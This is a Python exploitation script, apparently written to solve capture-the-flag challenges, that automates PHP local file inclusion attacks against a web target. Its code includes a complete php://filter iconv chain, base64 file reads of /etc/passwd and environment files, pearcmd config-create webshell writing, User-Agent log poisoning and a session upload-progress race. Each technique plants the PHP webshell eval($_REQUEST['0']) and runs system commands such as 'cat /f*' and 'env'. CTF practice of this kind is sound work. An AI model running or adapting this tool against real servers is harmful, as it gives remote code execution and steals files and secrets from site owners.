#此物开发于2023/9/27 22点33分
#刚打完永劫，被干碎了，有点乏味，所以来写一个脚本玩玩
#因为LFI基本上已经被开发到头了，所以就针对LFI写一个各种payload的冲刺工具
#便于各类新生赛秒题目
#写入的木马内容一律为<?php eval($_REQUEST['0']);?>

import base64
import urllib.request
import requests
import re
import threading
import io

thread_i = True #线程信号
flag_re = re.compile("\w+{\S+}")#flag匹配正则
base64_re = re.compile("^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$",re.M) #base64

file_list = ["/flag","/flag.sh","/readflag","/start.sh","dockerfile","Dockerfile",  #docker文件与flag文件
             "/porc/self/environ","proc/1/environ","proc/self/cmdline",  #环境变量
             "/var/www/html/flag.php","/var/www/html/index.php","flag.php","index.php",
             "/usr/share/php/pearcmd.php","/usr/local/lib/php/pearcmd.php","/usr/share/php/peclcmd.php","/usr/local/lib/php/peclcmd.php",  #pearcmd
             "/etc/httpd/logs/access_log","/var/log/httpd/access_log","/var/log/nginx/access.log","/var/log/apache2/access.log",  #日志文件
             "/etc/nginx/nginx.conf","/etc/httpd/conf/httpd.conf","/etc/apache2/apache2.conf"  #配置文件
             ]
pearcmd_list = []
log_list = []


def extract_flag(result):
    if flag_re.findall(result):
        print(flag_re.findall(result))

def extract_base64(result):
    if base64_re.findall(result):
        return base64.b64decode(base64_re.findall(result)[-1])


#请求发送函数
def check_request(method,url,params,cookie):
    if method == "GET":
        # print(requests.get(url,params = params,cookies=cookie).text)  #看看这个
        return requests.get(url,params = params,cookies=cookie).text
    elif method == "POST":
        return str(requests.post(url,data=params,cookies=cookie).content)[2:-1]

def check_and_exploit(method,url,params_name,payload,cookie):

    params = {
        params_name:payload,
        "0":"system('id');"
    }

    result = check_request(method,url,params,cookie)

    #判断是否成功执行命令
    if "uid" in result:
        # 进行一个flag获取
        getshell_params1 = {
            params_name: payload,
            "0": "system('cat /f*');"
        }
        getshell_result_1 = check_request(method, url, getshell_params1, cookie)
        # print(getshell_result_1)
        getshell_params2 = {
            params_name: payload,
            "0": "system('env');"
        }
        getshell_result_2 = check_request(method, url, getshell_params2, cookie)
        # print(getshell_result_2)
        # 提取response中的flag
        extract_flag(getshell_result_1)
        extract_flag(getshell_result_2)
    else:
        print("G了这个")

#filterchan函数
def filter_chain(method,url,params_name,cookie,file):
    print("开始利用filter chain")
    if len(file)>1:
        payload = f"php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource={file}"
    else:
        payload = "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"


    try:
        check_and_exploit(method,url,params_name,payload,cookie)
    except:
        print("filter chain G了")



def filter(method,url,params_name,cookie,file):
    if len(file)>1:
        payload = f"php://filter/read=convert.base64-encode/resource={file}"
    else:
        payload = "php://filter/read=convert.base64-encode/resource=/etc/passwd"

    param = {
        params_name:payload
    }
    result =check_request(method,url,param,cookie)

    try:
        if b"root:x" in extract_base64(result):
            print("filter伪协议可用,开始对可能存在的文件进行读取")
    except:
        print("filter协议还不能用啊?反正etcpasswd读不了")

def file_traversal(method,url,params_name,cookie):
    print("开始进行文件遍历")
    link = "/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root"

    for file in file_list:
        params = {
            params_name:f"php://filter/read=convert.base64-encode/resource={link}{file}"
        }

        result = check_request(method,url,params,cookie)
        try:
            file_content = extract_base64(result)
            if len(file_content)>1:
                f =  open("./LFI_file/"+file.split("/").pop(),"w+")
                f.write(file_content.decode())

                if "cmd.php" in file:
                    pearcmd_list.append(file)
                if "log" in file:
                    log_list.append(file)

                print(file+"存在，已写入LFI_file目录中")
        except:
            pass
    print("如果没有匹配到文件,大概是因为base64正则没匹配到,那就自己测试吧")

def file_traversal_nophp(method,url,params_name,cookie):
    print("防过滤版启动")
    for file in file_list:
        params = {
            params_name:file
        }

        file_content = check_request(method,url,params,cookie)
        try:
            ##这里最好判断一下
            if len(file_content)>10:
                f =  open("./LFI_file/"+file.split("/").pop(),"w+")
                f.write(file_content)

                if "cmd.php" in file:
                    pearcmd_list.append(file)
                if "log" in file:
                    log_list.append(file)

                print(file+"存在，已写入LFI_file目录中")


        except:
            pass



def pear_run(method, url, params_name, cookie):
    if len(pearcmd_list)>1:
        print("开始进行pearcmd利用")
        for file in pearcmd_list:
            print(f"正在试图使用{file}")
            try:
                if method == "GET":
                    Get_url = url + f"?+config-create+/&file={file}&/<?=eval($_REQUEST['0'])?>+/tmp/shell.php"
                    print(Get_url)
                    re = urllib.request.Request(Get_url)
                    result = urllib.request.urlopen(re)

                if method =="POST":
                    post_data = bytes(urllib.parse.urlencode({params_name:file}), encoding='utf8')

                    POST_url = url + "?+config-create+/&/<?=eval($_REQUEST['0'])?>+/tmp/shell.php"
                    re = urllib.request.Request(POST_url)
                    result = urllib.request.urlopen(re,data=post_data)
                check_and_exploit(method,url,params_name,"/tmp/shell.php",cookie)
            except:
                print("pearcmd利用产生了未知错误")
    else:
        print("不存在pearcmd文件")



def session_run(method, url, params_name, cookie):
    print("session文件包含启动")
    #直接写webshell那就用这个
    # data = {"PHP_SESSION_UPLOAD_PROGRESS": "aaa<?php $op=fopen(\"shell.php\",\"a+\");fwrite($op,'<?php @eval($_REQUEST[\"0\"]);?>');fclose($op);?>"}
    data = {"PHP_SESSION_UPLOAD_PROGRESS": "aaa<?php $op=fopen(\"/tmp/shell.php\",\"a+\");fwrite($op,'<?php @eval($_REQUEST[\"0\"]);?>');fclose($op);?>"}

    f = io.BytesIO(b'a' * 1024 * 5)
    def send_file(session):
        global thread_i
        while thread_i:
            respond = session.post(url=url, data=data, cookies=cookie, files={'file': ('test.txt', f)})

    def get_flag(method,url,params_name,session):
        global thread_i
        if method == "GET":
            while thread_i:
                payload_url = url + f"?{params_name}=" + "/tmp/sess_Aecous"
                resp = session.get(url=payload_url)
                if 'aaa' in resp.text:
                    print("已经成功写入/tmp/shell.php,密码为0")
                    thread_i = False
                    check_and_exploit(method,url,params_name,"/tmp/shell.php",cookie)
                    break

        elif method == "POST":
            params = {
                params_name:"/tmp/sess_Aecous"
            }
            while thread_i:
                resp = session.post(url=url,data=params)
                if 'aaa' in resp.text:
                    print("已经成功在web目录下写入shell.php,密码为0")
                    thread_i = False
                    check_and_exploit(method,url,params_name,"/tmp/shell.php",cookie)
                    break
        else:
            print("method参数不正确？？！！")
            exit()

    session=requests.session()
    t=threading.Thread(target=send_file,args=(session,))
    t.start()
    get_flag(method,url,params_name,session)


def log_run(method, url, params_name, cookie):
    if len(log_list)>1:
        print("开始进行日志包含")
        shell_inject = requests.get(url,
                                    headers={
                                        "User-Agent":"<?php eval($_REQUEST['0']);?>"
                                    })

        for log in log_list:
            check_and_exploit(method,url,params_name,log,cookie)

        print("利用结束")




if __name__ == "__main__":
    method = "GET"    # GET / POST
    url = "http://node5.anna.nssctf.cn:28953/index.php"
    params_name = "file"   #参数
    cookie = {
        "PHPSESSID":"Aecous" #session的参数，不可缺少
    } #如果有其他的数据就添上
    file = ""   #指定读取的文件，一般配合filterchain使用,通常置空



    print("----------------------------------------")
    filter_chain(method,url,params_name,cookie,file)   #测试filterchain
    print("----------------------------------------")
    filter(method,url,params_name,cookie,file)   #测试是否能使用filter伪协议
    print("----------------------------------------")
    file_traversal(method, url, params_name, cookie)  #进行文件遍历
    print("----------------------------------------")
    #如果有过滤的用这个
    # file_traversal_nophp(method, url, params_name, cookie)  #进行文件遍历
    print("----------------------------------------")
    pear_run(method, url, params_name, cookie)   # pear启动！
    print("----------------------------------------")
    log_run(method, url, params_name, cookie)  #日志包含启动
    print("----------------------------------------")
    session_run(method,url,params_name,cookie)   # session文件包含 启动！
    print("----------------------------------------")



